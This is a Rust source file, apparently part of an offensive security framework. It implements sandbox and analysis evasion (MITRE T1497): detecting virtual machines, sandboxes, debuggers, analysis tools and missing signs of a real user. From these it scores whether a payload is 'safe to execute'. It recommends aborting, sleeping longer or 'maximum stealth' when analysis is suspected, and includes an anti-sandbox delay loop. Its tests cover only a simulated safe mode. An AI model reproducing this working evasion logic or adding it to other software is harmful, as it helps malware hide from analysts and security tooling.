//! Environment Detection Engine
//!
//! Comprehensive detection of VMs, sandboxes, and analysis environments.
//!
//! MITRE ATT&CK: T1497 (Virtualization/Sandbox Evasion)
//!
//! **SECURITY NOTICE**: AUTHORIZED USE ONLY

use super::sandbox_signatures::{get_sandbox_signatures, AnalysisArtifacts, SandboxType};
use super::timing_checks::TimingChecker;
use super::vm_signatures::{get_vm_signatures, VmType};
use serde::{Deserialize, Serialize};

/// Detection sensitivity level
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
pub enum DetectionSensitivity {
    /// Only obvious indicators
    Low,
    /// Standard checks
    #[default]
    Medium,
    /// Aggressive detection
    High,
}

impl DetectionSensitivity {
    /// Get detection threshold
    pub fn threshold(&self) -> usize {
        match self {
            Self::Low => 3,
            Self::Medium => 2,
            Self::High => 1,
        }
    }

    /// Get suspicion threshold for execution decision
    pub fn suspicion_threshold(&self) -> f64 {
        match self {
            Self::Low => 0.8,
            Self::Medium => 0.5,
            Self::High => 0.3,
        }
    }
}

/// Environment detection result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EnvironmentReport {
    /// Detected VM type (if any)
    pub detected_vm: Option<VmType>,
    /// Detected sandbox type (if any)
    pub detected_sandbox: Option<SandboxType>,
    /// Detected analysis tools
    pub analysis_tools: Vec<String>,
    /// Suspicion score (0.0 - 1.0)
    pub suspicion_score: f64,
    /// Is it safe to execute?
    pub is_safe_to_execute: bool,
    /// Recommended actions
    pub recommendations: Vec<String>,
    /// Timing anomalies detected
    pub timing_anomalies: Vec<String>,
    /// Is being debugged
    pub is_debugged: bool,
    /// Has human activity
    pub has_human_activity: bool,
}

/// Environment Detector Engine
#[derive(Debug)]
pub struct EnvironmentDetector {
    sensitivity: DetectionSensitivity,
    timing_checker: TimingChecker,
    safe_mode: bool,
}

impl Default for EnvironmentDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl EnvironmentDetector {
    /// Create new Environment Detector
    pub fn new() -> Self {
        Self {
            sensitivity: DetectionSensitivity::Medium,
            timing_checker: TimingChecker::new(),
            safe_mode: false,
        }
    }

    /// Set detection sensitivity
    pub fn with_sensitivity(mut self, sensitivity: DetectionSensitivity) -> Self {
        self.sensitivity = sensitivity;
        self
    }

    /// Enable safe mode (simulated detection)
    pub fn with_safe_mode(mut self, enabled: bool) -> Self {
        self.safe_mode = enabled;
        self.timing_checker = TimingChecker::new().with_safe_mode(enabled);
        self
    }

    /// Detect if running in a VM
    pub fn detect_vm(&self) -> Option<VmType> {
        if self.safe_mode {
            return None;
        }

        let signatures = get_vm_signatures();
        let threshold = self.sensitivity.threshold();

        for sig in &signatures {
            let mut score = 0;

            // Check processes
            score += self.check_processes(sig.processes);

            // Check services
            score += self.check_services(sig.services);

            // Check files
            score += self.check_files(sig.files);

            // Check registry (Windows)
            #[cfg(windows)]
            {
                score += self.check_registry(sig.registry_keys);
            }

            // Check MAC address
            score += self.check_mac_prefix(sig.mac_prefixes);

            // Check drivers
            score += self.check_drivers(sig.drivers);

            if score >= threshold {
                return Some(sig.vm_type);
            }
        }

        None
    }

    /// Detect if running in a sandbox
    pub fn detect_sandbox(&self) -> Option<SandboxType> {
        if self.safe_mode {
            return None;
        }

        let signatures = get_sandbox_signatures();
        let threshold = self.sensitivity.threshold();

        for sig in &signatures {
            let mut score = 0;

            // Check processes
            score += self.check_processes(sig.processes);

            // Check files
            score += self.check_files(sig.files);

            // Check username
            score += self.check_username(sig.usernames);

            // Check computer name
            score += self.check_computer_name(sig.computer_names);

            // Check DLLs
            score += self.check_loaded_dlls(sig.dlls);

            if score >= threshold {
                return Some(sig.sandbox_type);
            }
        }

        // Check generic suspicious artifacts
        if self.check_suspicious_username() || self.check_suspicious_computer_name() {
            return Some(SandboxType::Unknown);
        }

        None
    }

    /// Detect analysis tools
    pub fn detect_analysis_tools(&self) -> Vec<String> {
        if self.safe_mode {
            return vec![];
        }

        let mut found = Vec::new();

        // Check analysis processes
        found.extend(self.find_running_processes(AnalysisArtifacts::analysis_processes()));

        // Check analysis DLLs
        found.extend(self.find_loaded_dlls(AnalysisArtifacts::analysis_dlls()));

        found
    }

    /// Check if being debugged
    pub fn is_being_debugged(&self) -> bool {
        if self.safe_mode {
            return false;
        }

        #[cfg(windows)]
        {
            unsafe {
                #[link(name = "kernel32")]
                extern "system" {
                    fn IsDebuggerPresent() -> i32;
                }
                IsDebuggerPresent() != 0
            }
        }

        #[cfg(not(windows))]
        {
            // Check /proc/self/status on Linux
            std::fs::read_to_string("/proc/self/status")
                .ok()
                .and_then(|content| {
                    content
                        .lines()
                        .find(|l| l.starts_with("TracerPid:"))
                        .and_then(|line| line.split_whitespace().nth(1))
                        .map(|pid| pid != "0")
                })
                .unwrap_or(false)
        }
    }

    /// Check for human activity indicators
    pub fn has_human_activity(&self) -> bool {
        if self.safe_mode {
            return true;
        }

        // Check desktop icons count
        let has_desktop_items = self.check_desktop_items();

        // Check recent files
        let has_recent_files = self.check_recent_files();

        // Check browser history/profiles exist
        let has_browser_data = self.check_browser_data();

        has_desktop_items || has_recent_files || has_browser_data
    }

    /// Full environment assessment
    pub fn assess_environment(&mut self) -> EnvironmentReport {
        let detected_vm = self.detect_vm();
        let detected_sandbox = self.detect_sandbox();
        let analysis_tools = self.detect_analysis_tools();
        let is_debugged = self.is_being_debugged();
        let has_human_activity = self.has_human_activity();

        // Run timing checks
        let timing_results = self.timing_checker.run_all_checks();
        let timing_anomalies: Vec<String> = timing_results
            .iter()
            .filter(|r| r.is_suspicious)
            .map(|r| r.message.clone())
            .collect();

        // Calculate suspicion score
        let mut suspicion_score = 0.0;

        if let Some(vm) = &detected_vm {
            if vm.is_cloud() {
                suspicion_score += 0.1; // Cloud is less suspicious
            } else {
                suspicion_score += 0.3;
            }
        }
        if detected_sandbox.is_some() {
            suspicion_score += 0.5;
        }
        if !analysis_tools.is_empty() {
            suspicion_score += 0.2 * (analysis_tools.len() as f64 / 5.0).min(1.0);
        }
        if is_debugged {
            suspicion_score += 0.3;
        }
        if !has_human_activity {
            suspicion_score += 0.2;
        }
        suspicion_score += self.timing_checker.get_suspicion_score() * 0.3;

        suspicion_score = suspicion_score.min(1.0);

        // Determine if safe to execute
        let is_safe = suspicion_score < self.sensitivity.suspicion_threshold();

        // Generate recommendations
        let mut recommendations = Vec::new();

        if let Some(vm) = &detected_vm {
            if vm.is_cloud() {
                recommendations.push("Cloud environment detected - likely legitimate".to_string());
            } else {
                recommendations.push(format!(
                    "VM detected ({}) - consider delayed execution",
                    vm.vendor()
                ));
            }
        }

        if let Some(sandbox) = &detected_sandbox {
            recommendations.push(format!(
                "Sandbox detected ({}) - abort or use extended sleep",
                sandbox.name()
            ));
        }

        if !analysis_tools.is_empty() {
            recommendations
                .push("Analysis tools detected - maximum stealth recommended".to_string());
        }

        if is_debugged {
            recommendations.push("Debugger attached - consider anti-debug measures".to_string());
        }

        if !has_human_activity {
            recommendations.push("No human activity - possible automated analysis".to_string());
        }

        if !is_safe {
            recommendations.push("High risk environment - execution not recommended".to_string());
        }

        EnvironmentReport {
            detected_vm,
            detected_sandbox,
            analysis_tools,
            suspicion_score,
            is_safe_to_execute: is_safe,
            recommendations,
            timing_anomalies,
            is_debugged,
            has_human_activity,
        }
    }

    /// Check if safe to execute (quick check)
    pub fn is_safe_to_execute(&mut self) -> bool {
        let report = self.assess_environment();
        report.is_safe_to_execute
    }

    /// Anti-sandbox delay with human activity check
    pub fn anti_sandbox_delay(&self, min_seconds: u64) -> bool {
        if self.safe_mode {
            return true;
        }

        let start = std::time::Instant::now();
        let min_duration = std::time::Duration::from_secs(min_seconds);

        while start.elapsed() < min_duration {
            // Check for human activity periodically
            if self.has_human_activity() {
                return true; // Human detected, safe to proceed
            }

            // Random-ish sleep to avoid detection
            let sleep_ms = 4500 + ((start.elapsed().as_millis() % 1000) as u64);
            std::thread::sleep(std::time::Duration::from_millis(sleep_ms));
        }

        // Timeout reached, decide based on sensitivity
        match self.sensitivity {
            DetectionSensitivity::High => false, // Don't proceed
            _ => true,                           // Proceed anyway
        }
    }

    // ========== Private helper methods ==========

    fn check_processes(&self, targets: &[&str]) -> usize {
        self.find_running_processes(targets).len()
    }

    fn check_services(&self, _targets: &[&str]) -> usize {
        // Service checking implementation
        0
    }

    fn check_files(&self, targets: &[&str]) -> usize {
        targets
            .iter()
            .filter(|f| std::path::Path::new(f).exists())
            .count()
    }

    #[cfg(windows)]
    fn check_registry(&self, targets: &[&str]) -> usize {
        use std::process::Command;

        targets
            .iter()
            .filter(|key| {
                Command::new("reg")
                    .args(["query", key])
                    .output()
                    .map(|o| o.status.success())
                    .unwrap_or(false)
            })
            .count()
    }

    fn check_mac_prefix(&self, _prefixes: &[&str]) -> usize {
        // Get MAC addresses and check prefixes
        // Simplified implementation
        0
    }

    fn check_drivers(&self, targets: &[&str]) -> usize {
        #[cfg(windows)]
        {
            let driver_path = std::path::Path::new(r"C:\Windows\System32\drivers");
            targets
                .iter()
                .filter(|d| driver_path.join(d).exists())
                .count()
        }

        #[cfg(not(windows))]
        {
            let _ = targets;
            0
        }
    }

    fn check_username(&self, targets: &[&str]) -> usize {
        if let Ok(username) = std::env::var("USERNAME").or_else(|_| std::env::var("USER")) {
            let username_lower = username.to_lowercase();
            if targets
                .iter()
                .any(|t| username_lower.contains(&t.to_lowercase()))
            {
                return 1;
            }
        }
        0
    }

    fn check_computer_name(&self, targets: &[&str]) -> usize {
        if let Ok(name) = std::env::var("COMPUTERNAME")
            .or_else(|_| std::fs::read_to_string("/etc/hostname").map(|s| s.trim().to_string()))
        {
            let name_upper = name.to_uppercase();
            if targets
                .iter()
                .any(|t| name_upper.contains(&t.to_uppercase()))
            {
                return 1;
            }
        }
        0
    }

    fn check_suspicious_username(&self) -> bool {
        if let Ok(username) = std::env::var("USERNAME").or_else(|_| std::env::var("USER")) {
            let username_lower = username.to_lowercase();
            return AnalysisArtifacts::suspicious_usernames()
                .iter()
                .any(|s| username_lower == *s);
        }
        false
    }

    fn check_suspicious_computer_name(&self) -> bool {
        if let Ok(name) = std::env::var("COMPUTERNAME")
            .or_else(|_| std::fs::read_to_string("/etc/hostname").map(|s| s.trim().to_string()))
        {
            let name_upper = name.to_uppercase();
            return AnalysisArtifacts::suspicious_computer_names()
                .iter()
                .any(|s| name_upper.contains(&s.to_uppercase()));
        }
        false
    }

    fn check_loaded_dlls(&self, _targets: &[&str]) -> usize {
        // Check loaded DLLs
        0
    }

    fn find_running_processes(&self, targets: &[&str]) -> Vec<String> {
        let mut found = Vec::new();

        #[cfg(windows)]
        {
            use std::process::Command;

            if let Ok(output) = Command::new("tasklist").output() {
                let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();
                for target in targets {
                    if output_str.contains(&target.to_lowercase()) {
                        found.push(target.to_string());
                    }
                }
            }
        }

        #[cfg(not(windows))]
        {
            use std::process::Command;

            if let Ok(output) = Command::new("ps").args(["aux"]).output() {
                let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();
                for target in targets {
                    let name = target.trim_end_matches(".exe").to_lowercase();
                    if output_str.contains(&name) {
                        found.push(target.to_string());
                    }
                }
            }
        }

        found
    }

    fn find_loaded_dlls(&self, _targets: &[&str]) -> Vec<String> {
        Vec::new()
    }

    fn check_desktop_items(&self) -> bool {
        #[cfg(windows)]
        {
            if let Ok(profile) = std::env::var("USERPROFILE") {
                let desktop = std::path::Path::new(&profile).join("Desktop");
                if let Ok(entries) = std::fs::read_dir(desktop) {
                    return entries.count() >= AnalysisArtifacts::min_expected_desktop_files();
                }
            }
        }
        true // Assume yes if can't check
    }

    fn check_recent_files(&self) -> bool {
        #[cfg(windows)]
        {
            if let Ok(appdata) = std::env::var("APPDATA") {
                let recent =
                    std::path::Path::new(&appdata).join("Microsoft\\Windows\\Recent");
                if let Ok(entries) = std::fs::read_dir(recent) {
                    return entries.count() >= AnalysisArtifacts::min_expected_recent_files();
                }
            }
        }
        true
    }

    fn check_browser_data(&self) -> bool {
        #[cfg(windows)]
        {
            if let Ok(local) = std::env::var("LOCALAPPDATA") {
                let chrome =
                    std::path::Path::new(&local).join("Google\\Chrome\\User Data\\Default");
                let firefox_profile = std::path::Path::new(&local)
                    .parent()
                    .map(|p| p.join("Roaming\\Mozilla\\Firefox\\Profiles"));

                return chrome.exists()
                    || firefox_profile.map(|p| p.exists()).unwrap_or(false);
            }
        }
        true
    }
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_env_detector_creation() {
        let detector = EnvironmentDetector::new();
        assert_eq!(detector.sensitivity, DetectionSensitivity::Medium);
    }

    #[test]
    fn test_sensitivity_levels() {
        let detector =
            EnvironmentDetector::new().with_sensitivity(DetectionSensitivity::High);
        assert_eq!(detector.sensitivity, DetectionSensitivity::High);
    }

    #[test]
    fn test_sensitivity_threshold() {
        assert_eq!(DetectionSensitivity::Low.threshold(), 3);
        assert_eq!(DetectionSensitivity::Medium.threshold(), 2);
        assert_eq!(DetectionSensitivity::High.threshold(), 1);
    }

    #[test]
    fn test_safe_mode_no_detections() {
        let mut detector = EnvironmentDetector::new().with_safe_mode(true);
        let report = detector.assess_environment();

        assert!(report.detected_vm.is_none());
        assert!(report.detected_sandbox.is_none());
        assert!(report.analysis_tools.is_empty());
        assert!(report.is_safe_to_execute);
    }

    #[test]
    fn test_safe_mode_debugger_check() {
        let detector = EnvironmentDetector::new().with_safe_mode(true);
        assert!(!detector.is_being_debugged());
    }

    #[test]
    fn test_safe_mode_human_activity() {
        let detector = EnvironmentDetector::new().with_safe_mode(true);
        assert!(detector.has_human_activity());
    }

    #[test]
    fn test_assess_environment_safe_mode() {
        let mut detector = EnvironmentDetector::new().with_safe_mode(true);
        let report = detector.assess_environment();

        assert!(report.suspicion_score >= 0.0);
        assert!(report.suspicion_score <= 1.0);
        assert!(report.has_human_activity);
        assert!(!report.is_debugged);
    }

    #[test]
    fn test_is_safe_to_execute_safe_mode() {
        let mut detector = EnvironmentDetector::new().with_safe_mode(true);
        assert!(detector.is_safe_to_execute());
    }

    #[test]
    fn test_anti_sandbox_delay_safe_mode() {
        let detector = EnvironmentDetector::new().with_safe_mode(true);
        // Should return immediately in safe mode
        assert!(detector.anti_sandbox_delay(0));
    }

    #[test]
    fn test_report_structure() {
        let mut detector = EnvironmentDetector::new().with_safe_mode(true);
        let report = detector.assess_environment();

        // Verify report structure
        assert!(report.recommendations.is_empty() || !report.recommendations.is_empty());
        assert!(report.timing_anomalies.is_empty() || !report.timing_anomalies.is_empty());
    }
}
